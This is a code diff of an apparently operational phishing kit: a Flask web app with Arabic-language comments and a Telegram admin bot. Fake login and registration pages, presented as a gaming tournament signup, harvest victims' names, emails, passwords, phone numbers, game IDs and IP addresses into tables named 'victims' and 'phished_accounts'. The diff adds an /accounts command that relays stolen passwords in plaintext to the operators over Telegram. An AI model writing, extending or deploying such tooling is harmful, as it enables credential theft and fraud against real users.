@@ -20,7 +20,7 @@ if not TELEGRAM_TOKEN:
     raise ValueError("TELEGRAM_TOKEN not set")
 
 if not ADMIN_IDS:
-    logging.warning("ADMIN_IDS فارغ! لن تُرسل أي رسائل.")
+    logging.warning("[!] ADMIN_IDS فارغ! لن تُرسل أي رسائل.")
 
 # ========== Flask ==========
 app = Flask(__name__, template_folder='.')
@@ -31,7 +31,7 @@ DB_PATH = "data.db"
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    # جدول الضحايا الرئيسي
+    # جدول الضحايا (البطولات)
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         session_id TEXT,
@@ -82,7 +82,7 @@ def save_phished_account(session_id, full_name, email, password, ip, ua):
               (session_id, full_name, email, password, ip, ua, datetime.now().isoformat()))
     conn.commit()
     conn.close()
-    
+
     msg = (
         f"📝 **بيانات إنشاء حساب جديد!**\n"
         f"🆔 الجلسة: `{session_id}`\n"
@@ -103,17 +103,17 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
               (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
     conn.commit()
-    
+
     # البحث عن بيانات إنشاء الحساب المرتبطة بنفس session_id
     c.execute("SELECT full_name, email, password FROM phished_accounts WHERE session_id = ? ORDER BY id DESC LIMIT 1", (session_id,))
     login_data = c.fetchone()
     conn.close()
-    
+
     if login_data:
         acc_name, acc_email, acc_pass = login_data
     else:
         acc_name, acc_email, acc_pass = "غير موجود", "غير موجود", "غير موجود"
-    
+
     msg = (
         f"🎯 **بيانات البطولة!**\n"
         f"🆔 الجلسة: `{session_id}`\n"
@@ -140,7 +140,6 @@ def home():
 def health():
     return "OK", 200
 
-# ✅ تغيير المسارات لتجنب التضارب
 @app.route('/login/<session_id>', methods=['GET', 'POST'])
 def login_page(session_id):
     if request.method == 'POST':
@@ -148,7 +147,6 @@ def login_page(session_id):
         password = request.form.get('password', '').strip()
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        # تسجيل الدخول لا يحتوي على full_name
         save_phished_account(session_id, "", email, password, ip, ua)
         return redirect(f'/tournament/{session_id}')
     return render_template('login.html', session_id=session_id)
@@ -161,8 +159,6 @@ def register_page(session_id):
         password = request.form.get('password', '').strip()
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        
-        # ✅ استخدام الدالة الموحدة مع full_name
         save_phished_account(session_id, full_name, email, password, ip, ua)
         return redirect(f'/tournament/{session_id}')
     return render_template('register.html', session_id=session_id)
@@ -204,7 +200,8 @@ async def start(update, context):
         "🔥 **بوت الإدارة v2.0**\n\n"
         "**الأوامر:**\n"
         "/link - إنشاء رابط جديد\n"
-        "/list - عرض البيانات\n"
+        "/list - عرض كل البيانات\n"
+        "/accounts - عرض بيانات الحسابات فقط\n"
         "/stats - إحصائيات",
         parse_mode='Markdown'
     )
@@ -213,7 +210,6 @@ async def generate_link(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         return
     session_id = secrets.token_urlsafe(8)
-    # ✅ تحديث الروابط للمسارات الجديدة
     link = f"{BASE_URL}/register/{session_id}"
     await update.message.reply_text(
         f"🔗 **رابط جديد**\n\n"
@@ -228,16 +224,75 @@ async def list_victims(update, context):
         return
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
+
+    # بيانات البطولات
     c.execute("SELECT id, full_name, phone_number, game_id, email, timestamp FROM victims ORDER BY id DESC LIMIT 10")
+    victims_data = c.fetchall()
+
+    # بيانات إنشاء الحسابات
+    c.execute("SELECT id, full_name, email, password, timestamp FROM phished_accounts ORDER BY id DESC LIMIT 10")
+    accounts_data = c.fetchall()
+    conn.close()
+
+    msg = ""
+
+    if victims_data:
+        msg += "📋 **بيانات البطولات:**\n\n"
+        for v in victims_data:
+            msg += f"🆔 `{v[0]}` | 👤 {v[1]} | 📞 {v[2]} | 🎮 {v[3]} | 📧 {v[4]}\n"
+    else:
+        msg += "📭 لا توجد بيانات بطولات.\n"
+
+    msg += "\n"
+
+    if accounts_data:
+        msg += "🔐 **بيانات إنشاء الحسابات:**\n\n"
+        for a in accounts_data:
+            name = a[1] if a[1] else "---"
+            msg += f"🆔 `{a[0]}` | 👤 {name} | 📧 {a[2]} | 🔑 `{a[3]}` | 📅 {a[4]}\n"
+    else:
+        msg += "📭 لا توجد بيانات حسابات.\n"
+
+    # تقسيم الرسالة إذا كانت طويلة
+    if len(msg) > 4000:
+        parts = [msg[i:i+4000] for i in range(0, len(msg), 4000)]
+        for part in parts:
+            await update.message.reply_text(part, parse_mode='Markdown')
+    else:
+        await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def list_accounts(update, context):
+    if update.effective_user.id not in ADMIN_IDS:
+        return
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id, full_name, email, password, ip, timestamp FROM phished_accounts ORDER BY id DESC LIMIT 15")
     data = c.fetchall()
     conn.close()
+
     if not data:
-        await update.message.reply_text("📭 لا يوجد بيانات.")
+        await update.message.reply_text("📭 لا توجد بيانات حسابات.")
         return
-    msg = "📋 **البيانات المستلمة:**\n\n"
-    for v in data:
-        msg += f"🆔 `{v[0]}` | 👤 {v[1]} | 📞 {v[2]} | 🎮 {v[3]} | 📧 {v[4]} | 📅 {v[5]}\n"
-    await update.message.reply_text(msg, parse_mode='Markdown')
+
+    msg = "🔐 **بيانات إنشاء الحسابات:**\n\n"
+    for a in data:
+        name = a[1] if a[1] else "---"
+        msg += (
+            f"🆔 `{a[0]}`\n"
+            f"👤 الاسم: `{name}`\n"
+            f"📧 البريد: `{a[2]}`\n"
+            f"🔑 الباسورد: `{a[3]}`\n"
+            f"🌐 IP: `{a[4]}`\n"
+            f"📅 الوقت: `{a[5]}`\n"
+            f"{'─'*20}\n"
+        )
+
+    if len(msg) > 4000:
+        parts = [msg[i:i+4000] for i in range(0, len(msg), 4000)]
+        for part in parts:
+            await update.message.reply_text(part, parse_mode='Markdown')
+    else:
+        await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def stats(update, context):
     if update.effective_user.id not in ADMIN_IDS:
@@ -261,6 +316,7 @@ app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
 app_bot.add_handler(CommandHandler("start", start))
 app_bot.add_handler(CommandHandler("link", generate_link))
 app_bot.add_handler(CommandHandler("list", list_victims))
+app_bot.add_handler(CommandHandler("accounts", list_accounts))
 app_bot.add_handler(CommandHandler("stats", stats))
 
 def run_bot():
@@ -277,10 +333,9 @@ def run_bot():
 # ========== المدخل الرئيسي ==========
 if __name__ == "__main__":
     init_db()
-    
+
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
-    
+
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
-    
